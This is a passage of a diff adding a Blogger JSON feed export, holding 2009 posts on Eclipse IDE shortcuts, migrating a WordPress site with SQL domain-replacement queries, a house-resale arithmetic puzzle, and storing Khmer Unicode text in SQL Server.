+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1338035374487678070"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/09/jibx-xml-loading-digester-which-one-is.html",
+            "title": "Jibx XML loading & Digester, which one is more flexible?"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "1"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-2050946863060268154"
+        },
+        "published": {
+          "$t": "2009-08-28T04:38:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-08-28T05:02:50.092-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "C/C++"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Eclipse"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "In brief about Eclipse IDE"
+        },
+        "content": {
+          "type": "html",
+          "$t": "<p><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Eclipse</b></span></span> <span style=\"font-size:100%;\"><span lang=\"en-US\">is a multi-language <a href=\"http://en.wikipedia.org/wiki/Software_development_environment\">software development environment</a> comprising an <a href=\"http://en.wikipedia.org/wiki/Integrated_development_environment\">IDE</a> and a <a href=\"http://en.wikipedia.org/wiki/Plug-in_%28computing%29\">plug-in</a> system to extend it. It is written primarily in <a href=\"http://en.wikipedia.org/wiki/Java_%28programming_language%29\">Java</a> and can be used to develop applications in Java and, by means of the various plug-ins, in other <a href=\"http://en.wikipedia.org/wiki/Programming_language\">languages</a> as well, including <a href=\"http://en.wikipedia.org/wiki/C_%28programming_language%29\">C</a>, <a href=\"http://en.wikipedia.org/wiki/C%2B%2B\">C++</a>, <a href=\"http://en.wikipedia.org/wiki/COBOL\">COBOL</a>, <a href=\"http://en.wikipedia.org/wiki/Python_%28programming_language%29\">Python</a>, <a href=\"http://en.wikipedia.org/wiki/Perl\">Perl</a>, <a href=\"http://en.wikipedia.org/wiki/PHP\">PHP</a>, and others.</span></span><span style=\"font-family:Times New Roman;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">[1]</span></span></span></p>   <p><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Website</b></span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">: <a href=\"http://www.eclipse.org/\">http://www.eclipse.org/</a></span></span></p><p><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Download</b></span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">: <a href=\"http://www.eclipse.org/downloads/\">http://www.eclipse.org/downloads/</a></span></span></p>  <p><span style=\"font-size:100%;\"><span lang=\"en-US\">Current version: Galileo, 3.5: <a href=\"http://wiki.eclipse.org/Galileo\">http://wiki.eclipse.org/Galileo</a></span></span></p>  <p lang=\"en-US\"><span style=\"font-size:100%;\"><b>Eclipse IDE is suitable with:</b></span></p>  <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">J2EE Development (To use </span></span><a href=\"http://www.eclipse.org/downloads/packages/eclipse-ide-java-ee-developers/galileor\"><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Eclipse IDE for Java EE Developers</b></span></span></a><span style=\"font-size:100%;\"><span lang=\"en-US\">)</span></span></p><p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Java Development (To use </span></span><a href=\"http://www.eclipse.org/downloads/packages/eclipse-ide-java-developers/galileor\"><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Eclipse IDE for Java Developer</b></span></span></a><span style=\"font-size:100%;\"><span lang=\"en-US\">)</span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">PHP Development (To use </span></span><a href=\"http://www.eclipse.org/downloads/packages/eclipse-php-developers/galileor\"><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Eclipse IDE for PHP Development</b></span></span></a><span style=\"font-size:100%;\"><span lang=\"en-US\">)</span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">C/C++ Development (To use </span></span><a href=\"http://www.eclipse.org/downloads/packages/eclipse-ide-cc-developers/galileor\"><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Eclipse IDE for C/C++ Development</b></span></span></a><span style=\"font-size:100%;\"><span lang=\"en-US\">)</span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Etc.</span></span></p>  <p lang=\"en-US\"><span style=\"font-size:100%;\"><b>Installation/To start:</b></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Jdk requires to install before install Eclipse, in new version of Eclipse 3.5 requires at least jdk 1.5</span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Just extract the eclipse and copy to some where in your PC</span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Point to your </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>workspace</b></span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">, </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>create project</b></span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"> and develop your application as well.</span></span></p>  <p><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Screenshot: </b></span></span><span lang=\"en-US\"><b>(Other screens see: <a href=\"http://www.eclipse.org/screenshots/\">http://www.eclipse.org/screenshots/</a>)</b></span></p>  <p lang=\"en-US\"><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_nrkAzoNZJ1JMsqbbl3uGSsRpZKi9TFGIVuJGQQ6H0NsIFM4OjpscEDufSr7tKqKFUTgh10vaQouw8hspdw1DhOPcMEFZOzmuIeeb7qsc0O3YBUlWqkoH7bpv96GNHJcWWLG35auOce1X/s1600-h/eclipse_workspace.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 261px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_nrkAzoNZJ1JMsqbbl3uGSsRpZKi9TFGIVuJGQQ6H0NsIFM4OjpscEDufSr7tKqKFUTgh10vaQouw8hspdw1DhOPcMEFZOzmuIeeb7qsc0O3YBUlWqkoH7bpv96GNHJcWWLG35auOce1X/s400/eclipse_workspace.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5374978992685644578\" border=\"0\" /></a><span style=\"font-size:100%;\"><b>Easy ways/Shortcuts:</b></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Wanna to go every where can start with shortcut: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Ctrl + 3</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">To see all shortcut: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Ctrl + Shift + L</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Rename on variable/method to change all reference: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Alt + Shift + R</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Search any file: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Ctrl + Shift + R</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Go to line number: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Ctrl + L</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Create View Object (set / get methods): </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Alt + Shift + S</b></span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"> and choose: </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\"><b>Generate Getters and Setters</b></span></span></p> <p style=\"margin-left: 0.5in; text-indent: -0.25in;\"><span style=\"font-size:100%;\"><span lang=\"en-US\">-</span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">         </span></span><span style=\"font-size:100%;\"><span lang=\"en-US\">Etc.</span></span></p><br /><hr align=\"left\"  width=\"257\" style=\"font-size:78%;\"> <p><span style=\"font-family:Times New Roman;\"><span style=\"font-size:85%;\"><span lang=\"en-US\">[1]</span></span></span> <span lang=\"en-US\">See wiki: <a href=\"http://en.wikipedia.org/wiki/Eclipse_%28software%29\">http://en.wikipedia.org/wiki/Eclipse_(software)</a></span></p> <p></p>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/2050946863060268154/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/08/in-short-about-eclipse-ide.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2050946863060268154"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2050946863060268154"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/08/in-short-about-eclipse-ide.html",
+            "title": "In brief about Eclipse IDE"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_nrkAzoNZJ1JMsqbbl3uGSsRpZKi9TFGIVuJGQQ6H0NsIFM4OjpscEDufSr7tKqKFUTgh10vaQouw8hspdw1DhOPcMEFZOzmuIeeb7qsc0O3YBUlWqkoH7bpv96GNHJcWWLG35auOce1X/s72-c/eclipse_workspace.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-2267702744688503657"
+        },
+        "published": {
+          "$t": "2009-08-18T04:52:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-08-18T23:25:44.333-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Hosting"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "PHP"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "WordPress"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "[WordPress] Move integrated local wordpress to production server"
+        },
+        "content": {
+          "type": "html",
+          "$t": "First I have read some post and I though it was right but when I followed I got same error such as executing timeout (<b style=\"font-style: italic; color: rgb(255, 102, 102);\">Fatal error</b><span style=\"font-style: italic; color: rgb(255, 102, 102);\">:  Maximum execution time of 30 seconds exceeded</span>) when browse the website etc.<br /><br />I have prepared the wordpress blog with some modification of the theme; integrated and tested my wanted plugin; prepare all pages, navigation etc. I have named my local site as: <span style=\"font-weight: bold;\">www.defondyann.loc</span> but when I move to the server for website: <span style=\"font-weight: bold;\">www.defondyann.com</span> I got above error and can't browse the page or went to the admin as well.<br /><br />I tried as following post:<br /><ul><li>http://www.mydigitallife.info/2007/10/01/how-to-move-wordpress-blog-to-new-domain-or-location/</li><li>http://yoast.com/move-wordpress-blog-domain-10-steps/</li><li>http://codex.wordpress.org/Moving_WordPress</li></ul>but not all worked for me so I took some points to do this way:<br /><br /><span style=\"font-weight: bold;\">I. </span>At my local server, I prepared the virtual host by naming as: <span style=\"font-weight: bold;\">www.defondyann.com</span>I'm sure you guy know how to do virtual host in windows; any way, here it is:<ul><li>apache2.2.6\\conf\\extra\\httpd-vhosts.conf</li></ul><pre><code><br />   ServerAdmin webmaster@defondyann.com<br />   DocumentRoot \"Z:/defondyann/wordpress\"<br />   ServerName defondyann.com<br />   ServerAlias www.defondyann.com<br />   ErrorLog \"logs/defondyann.com-error_log\"<br />   CustomLog \"logs/defondyann.com-common.log common\" combined<br /></code></pre><ul><li>Change at C:\\WINDOWS\\system32\\drivers\\etc\\hosts</li></ul><blockquote>127.0.0.1       www.defondyann.com</blockquote><span style=\"font-weight: bold;\">II.</span> I browsed the website locally with: <span style=\"font-weight: bold;\">www.defondyann.com </span>login to admin as normal<br /><span style=\"font-weight: bold;\">III.</span> Modified upload directory configuration in /wp-admin/options-misc.php<br /><ul><li>To change upload directory to: wp-content/uploads</li></ul><span style=\"font-weight: bold;\">IV.</span> Modified database, by execute update script via phpMyAdmin or any mysql client:<br /><br /><pre><code>UPDATE wp_options SET option_value = replace(option_value, 'http://www.defondyann.loc', 'http://www.defondyann.com') WHERE option_name = 'home' OR option_name = 'siteurl';<br />UPDATE wp_posts SET guid = replace(guid, 'http://www.defondyann.loc','http://www.defondyann.com');<br />UPDATE wp_posts SET post_content = replace(post_content, 'http://www.defondyann.loc', 'http://www.defondyann.com');</code></pre><br />It's working for me,<br />Good luck,"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/2267702744688503657/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/08/wordpress-move-local-wordpress.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2267702744688503657"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/2267702744688503657"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/08/wordpress-move-local-wordpress.html",
+            "title": "[WordPress] Move integrated local wordpress to production server"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-1110096010130925838"
+        },
+        "published": {
+          "$t": "2009-07-26T22:43:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-07-26T22:52:10.841-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Accounting"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Mathamatics"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Problam And Solution"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "[A Solution Game] A man bought a house"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Can anyone write the procedure how to solve this below problem?<br />It seems we will have two answers according to the way of resolvers thinking can be thinking with Maths or with Business, please write down and share in the comment:<br /><br /><span style=\"font-weight: bold;\">Problem:</span><br /><span style=\"font-weight: bold;\">======</span><br /><blockquote style=\"color: rgb(255, 0, 0);\">\"A person bought a house for <span style=\"font-weight: bold;\">$60,000</span>. Soon thereafter they sold it for <span style=\"font-weight: bold;\">$70,000</span>, upon moving out of town.<br />A few month later, they were transftered back to town and purchased the same house for <span style=\"font-weight: bold;\">$80,000</span>, then the person grew tired of the house and resold it for <span style=\"font-weight: bold;\">$90,000</span>.\"<br /><br />Question: How much money did the person gain/lose (or break even) on the exchange? How you calculate this?<br /></blockquote>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/1110096010130925838/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/07/solution-game-man-bought-house.html#comment-form",
+            "title": "4 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1110096010130925838"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/1110096010130925838"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/07/solution-game-man-bought-house.html",
+            "title": "[A Solution Game] A man bought a house"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "4"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-7608855896322494355"
+        },
+        "published": {
+          "$t": "2009-07-13T02:47:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-07-13T03:35:12.608-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Database"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Encoding"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "MS DotNet"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "SQL Server"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "SQL Server with Unicode / Khmer Unicode characters"
+        },
+        "content": {
+          "type": "html",
+          "$t": "To be notice MS SQL supports only UCS-2 encoding so do not have encoding with UTF-8 as we expected as MySQL or some other database server as well. This means that you can't use UTF-8 character encoding with Microsoft SQL Server:<br /><br /><div style=\"text-align: center;\">Here after I type Khmer Unicode and execute the query, I got question marks instead of characters:<br /></div><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJCsv26o7lmKWnKNK_hNjfwR45SvmEH0ARSsXe4vtZRpevGckrMpIwakBY2ddQfaH2ZGzf6qg8KQLbW868XeSvALSXVkHZN47M0mimV_nStpGx5uHq1oceQ0S3sxQvTx5XEtrRDtQjHagc/s1600-h/unicode_sql_server_0.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 228px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJCsv26o7lmKWnKNK_hNjfwR45SvmEH0ARSsXe4vtZRpevGckrMpIwakBY2ddQfaH2ZGzf6qg8KQLbW868XeSvALSXVkHZN47M0mimV_nStpGx5uHq1oceQ0S3sxQvTx5XEtrRDtQjHagc/s400/unicode_sql_server_0.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5357885866484329266\" border=\"0\" /></a><br />So if you need to store national characters in Microsoft SQL Server - please consider using a national character encoding (<a href=\"http://www.unicode.org/charts/PDF/U1780.pdf\">U+1780   to U+17FF</a> in Unicode/ISO10646 for Khmer Unicode characters, for example). Change data types: <ul class=\"Element630\"><li class=\"Element600\">varchar to nvarchar</li><li class=\"Element600\">text to ntext</li><li class=\"Element600\">char to nchar</li></ul>Here is the example since I created a table and insert data:<br /><div style=\"text-align: center;\">1. Create database (mtr_db) as normally (default setting)<br /></div><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiufrj-00_HsdJuhm7uUpw6gSNXUkhZq_FmV-IgScMImd_Ix5asw41B17Zb7kqkcFMNkP77i2HR5nKvlly110WTGQ0Q-fMfi_tFDtUEmcymrEYUHnSYZjFxiwxd0lhCJytVOyC4t4sRnEiQ/s1600-h/unicode_sql_server_1.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 223px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiufrj-00_HsdJuhm7uUpw6gSNXUkhZq_FmV-IgScMImd_Ix5asw41B17Zb7kqkcFMNkP77i2HR5nKvlly110WTGQ0Q-fMfi_tFDtUEmcymrEYUHnSYZjFxiwxd0lhCJytVOyC4t4sRnEiQ/s400/unicode_sql_server_1.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5357888911511310546\" border=\"0\" /></a><br /><div style=\"text-align: center;\">2. Create table (tblunicode) with two fields (id/name) but<br />name - data type <span style=\"font-weight: bold;\">nvarchar(MAX)<br /><br /></span><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrJIcZCikq9QFW1gvfwAc6yFJUFmfyxhIfRCfJNfSyjwqsscZLG-hl-xMOdE-M2swMU2eAxjF3vbssEtQ3GF0JDEHbJXGCpHwlQGQwS71ILaVaCH5bFNh_Hz1aqaASBw4z_5iUs_I44oyy/s1600-h/unicode_sql_server_2.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 119px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrJIcZCikq9QFW1gvfwAc6yFJUFmfyxhIfRCfJNfSyjwqsscZLG-hl-xMOdE-M2swMU2eAxjF3vbssEtQ3GF0JDEHbJXGCpHwlQGQwS71ILaVaCH5bFNh_Hz1aqaASBw4z_5iUs_I44oyy/s400/unicode_sql_server_2.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5357889739388831058\" border=\"0\" /></a><br />3. Insert Khmer Unicode and execute we got it as we typed!<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglAYvfFAoCetA1NDTALt9XYnSONbEFaEL4Vk4xml_qT1CwWa9cXvfgTIHpLlaqWILf9RnHFz3vBux1Hn9rJ21SDh6DDU13iWmHT6cBHRb1iWhV2j0NEKYqrj4Ti9Tr5T1Zah87QHU9a0hm/s1600-h/unicode_sql_server_3.JPG\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 400px; height: 248px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglAYvfFAoCetA1NDTALt9XYnSONbEFaEL4Vk4xml_qT1CwWa9cXvfgTIHpLlaqWILf9RnHFz3vBux1Hn9rJ21SDh6DDU13iWmHT6cBHRb1iWhV2j0NEKYqrj4Ti9Tr5T1Zah87QHU9a0hm/s400/unicode_sql_server_3.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5357891126869721826\" border=\"0\" /></a>Good luck!<br /><br /></div>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/7608855896322494355/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/07/sql-server-with-unicode-khmer-unicode.html#comment-form",
+            "title": "10 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/7608855896322494355"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/7608855896322494355"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2009/07/sql-server-with-unicode-khmer-unicode.html",
+            "title": "SQL Server with Unicode / Khmer Unicode characters"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJCsv26o7lmKWnKNK_hNjfwR45SvmEH0ARSsXe4vtZRpevGckrMpIwakBY2ddQfaH2ZGzf6qg8KQLbW868XeSvALSXVkHZN47M0mimV_nStpGx5uHq1oceQ0S3sxQvTx5XEtrRDtQjHagc/s72-c/unicode_sql_server_0.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "10"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-6443479352666484948"
+        },
+        "published": {
+          "$t": "2009-06-21T22:02:00.000-07:00"
+        },
+        "updated": {
+          "$t": "2009-06-21T23:01:07.070-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Chuon Nat"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Dictionary"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Dictionary"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Chuon Nat - Khmer Dictionary 2.0 with Unicode font"
+        },
+        "content": {
+          "type": "html",
